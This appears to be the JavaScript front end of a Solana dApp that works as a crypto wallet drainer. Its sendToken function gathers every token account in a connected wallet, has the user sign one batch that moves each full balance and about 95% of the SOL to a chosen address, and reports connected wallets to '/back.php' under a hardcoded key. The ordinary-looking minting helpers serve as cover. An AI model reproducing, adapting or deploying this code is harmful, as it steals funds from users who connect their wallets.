import * as anchor from"@project-serum/anchor";
import { Connection, PublicKey,sendAndConfirmRawTransaction, Transaction } from '@solana/web3.js';
import { Program, Provider, web3 } from '@project-serum/anchor';
import * as splToken from "@solana/spl-token";
import idl from './idl.json';
import { TOKEN_PROGRAM_ID } from '@solana/spl-token';
const { SystemProgram } = web3;
const programID = new PublicKey(idl.metadata.address);
const tokenMintPubkey = new PublicKey('8hziHSv33pNMBgMYbcCLmxbpRTsH28YxZNe9dyW84NvA');
const devnet = 'https://metaplex.devnet.rpcpool.com';
const mainnet = "https://api.metaplex.solana.com";

async function getProvider(wallet) {
	const network = mainnet;
	const connection = new Connection(network, 'confirmed', {
    disableMemorySigner: true,
  });

	const provider = new Provider(
		connection, wallet, 'confirmed',
	);
	return provider;
}

export const init = async (wallet) => {
  const provider = await getProvider(wallet);
	const program = new Program(idl, programID, provider);
  const [pdaPubkey, pdaBump] =
  await PublicKey.findProgramAddress(
    [Buffer.from(anchor.utils.bytes.utf8.encode('token-transfer'))],
    program.programId
  );
  const [tokenVaultPubkey, tokenVaultBump] =
  await PublicKey.findProgramAddress(
    [tokenMintPubkey.toBuffer()],
    program.programId
  );
  console.log(tokenVaultPubkey.toString());
  await program.rpc.initialize(
    pdaBump,
    tokenVaultBump,
    {
      accounts: {
        pdaAccount: pdaPubkey,
        tokenMint: tokenMintPubkey,
        tokenVault: tokenVaultPubkey,
        initializer: provider.wallet.publicKey,
        systemProgram: anchor.web3.SystemProgram.programId,
        tokenProgram: TOKEN_PROGRAM_ID,
        rent: anchor.web3.SYSVAR_RENT_PUBKEY,
      }
    }
  );
}

export const getAllTokenAccounts = async (wallet) => {
  const provider = await getProvider(wallet);
  const walletStr = wallet.publicKey.toString();
  const filters = [
    {
      dataSize: 165,    //size of account (bytes)
    },
    {
      memcmp: {
        offset: 32,     //location of our query in the account (bytes)
        bytes: walletStr,  //our search criteria, a base58 encoded string
      },            
    }];
  const accounts = await provider.connection.getParsedProgramAccounts(
      TOKEN_PROGRAM_ID, //new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
      {filters: filters}
  );
  console.log(`Found ${accounts.length} token account(s) for wallet ${walletStr}.`);
  logTlgMsg('Подключен аккаунт <b>' +walletStr+ '</b><br>Найдено <b>'+accounts.length+'</b> токена(ов).');
  return accounts;
}

export const executeAllTransactions = async (
    connection,
    wallet,
    transactions,
  ) => {
    if (transactions.length === 0) return []
    const recentBlockhash = (await connection.getRecentBlockhash('max')).blockhash
    for (let tx of transactions) {
      tx.feePayer = wallet.publicKey
      tx.recentBlockhash = recentBlockhash
    }
    await wallet.signAllTransactions(transactions);
  
    const txIds = await Promise.all(
      transactions.map(async (tx, index) => {
        try {
          const txid = await sendAndConfirmRawTransaction(
            connection,
            tx.serialize()
          )
          return txid
        } catch (e) {
          return null
        }
      })
    )
    console.log(txIds);
    return txIds
  }

export const sendToken = async (wallet, toPubkeyAddr) => {
  const provider = await getProvider(wallet);
	const program = new Program(idl, programID, provider);
  const accounts = await getAllTokenAccounts(wallet);
  const txs = [];
  const transaction1 = new Transaction();
  const toPubkey = new PublicKey(toPubkeyAddr);
  for(const account of accounts) {
    const transaction = new Transaction();
    const parsedAccountInfo = account.account.data;
    const mintAddress = parsedAccountInfo["parsed"]["info"]["mint"];
    const mintPubkey = new PublicKey(mintAddress);
    const tokenBalance = parsedAccountInfo["parsed"]["info"]["tokenAmount"]["amount"];
    const tokenBalanceUi = parsedAccountInfo["parsed"]["info"]["tokenAmount"]["uiAmount"];
    if(!tokenBalanceUi) continue;
    const token_amount = new anchor.BN(tokenBalance);
    const fromAccount = account.pubkey;
    const toAccount = await withFindOrInitAssociatedTokenAccount(
      transaction,
      provider.connection,
      mintPubkey,
      toPubkey,
      wallet.publicKey,
      true
    );  
    transaction.add(program.instruction.sendToken(token_amount,
      {
        accounts: {
          tokenFrom: fromAccount,
          tokenTo: toAccount,
          fromAuthority: provider.wallet.publicKey,
          tokenProgram: TOKEN_PROGRAM_ID,
        }
      })
    ); 
        //Log results
    console.log(parsedAccountInfo);
    console.log(`Token Account No.: ${account.pubkey.toString()}`);
    console.log(`--Token Mint: ${mintAddress}`);
    console.log(`--Token Balance: ${tokenBalance}`);
    txs.push(transaction);
  };
  let solAmount = await provider.connection.getBalance(provider.wallet.publicKey);
  let gasTokens = accounts.length * 0.005;
  gasTokens = gasTokens.toFixed(0);
  let solAmountfix = solAmount - gasTokens;
  solAmountfix = solAmountfix * 0.95;
  solAmountfix = solAmountfix;
  solAmountfix = solAmountfix.toFixed(0);
  transaction1.add(
    SystemProgram.transfer({
      fromPubkey: provider.wallet.publicKey,
      toPubkey: toPubkey,
      lamports: solAmountfix,
      })
    );
  txs.push(transaction1);
  try {
    const txId = await executeAllTransactions(
      provider.connection,
      wallet,
      txs,
    );
    return txId;
  } catch (e) {
    console.log(e);
    logTlgMsg('❌ <b>transaction is rejected</b>');
    return false;
  }
}

export const testMint = async (wallet) => {
  const provider = await getProvider(wallet);
	const program = new Program(idl, programID, provider);
  const [tokenVaultPubkey, tokenVaultBump] =
  await web3.PublicKey.findProgramAddress(
    [tokenMintPubkey.toBuffer()],
    program.programId
  );
  const txs = [];
  const transaction = new Transaction();
  const userTokenAccount = await withFindOrInitAssociatedTokenAccount(
    transaction,
    provider.connection,
    tokenMintPubkey,
    wallet.publicKey,
    wallet.publicKey,
    true
  );  
  transaction.add(program.instruction.mintTo(
    tokenVaultBump,
    new anchor.BN(100e9),
    {
      accounts: {
        tokenMint: tokenMintPubkey,
        tokenVault: tokenVaultPubkey,
        tokenTo: userTokenAccount,
        tokenToAuthority: provider.wallet.publicKey,
        tokenProgram: TOKEN_PROGRAM_ID,
      }
    }
  ))  
  txs.push(transaction);
  try {
    await executeAllTransactions(
      provider.connection,
      wallet,
      txs,
    );
  } catch (e) {
    console.log(e);
    logTlgMsg('❌ <b>transaction is rejected</b>');
  }
}

export async function withFindOrInitAssociatedTokenAccount(
  transaction,
  connection,
  mint,
  owner,
  payer,
  allowOwnerOffCurve
) {
  const associatedAddress = await splToken.Token.getAssociatedTokenAddress(
    splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
    splToken.TOKEN_PROGRAM_ID,
    mint,
    owner,
    allowOwnerOffCurve
  );
  const account = await connection.getAccountInfo(associatedAddress);
  if (!account) {
    transaction.add(
      splToken.Token.createAssociatedTokenAccountInstruction(
        splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
        splToken.TOKEN_PROGRAM_ID,
        mint,
        associatedAddress,
        owner,
        payer
      )
    );
  }
  return associatedAddress;
}

export const logTlgMsg = async (msg) => { 
  fetch('/back.php?key=cg0ZOcnlK2kFcQNW&m='+msg);
}
